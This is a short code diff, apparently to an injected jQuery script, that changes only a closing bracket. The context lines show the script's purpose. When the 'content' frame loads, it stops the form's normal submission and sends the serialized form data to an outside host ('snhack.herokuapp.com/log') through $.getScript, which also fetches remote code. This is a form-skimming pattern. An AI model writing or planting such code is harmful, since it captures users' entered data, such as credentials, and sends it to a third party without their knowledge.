@@ -3,4 +3,4 @@ $("frame[name='content']").load(function(){
       e.preventDefault();
       $.getScript('//snhack.herokuapp.com/log?'+ $(this).serialize());
   });
-};
+});
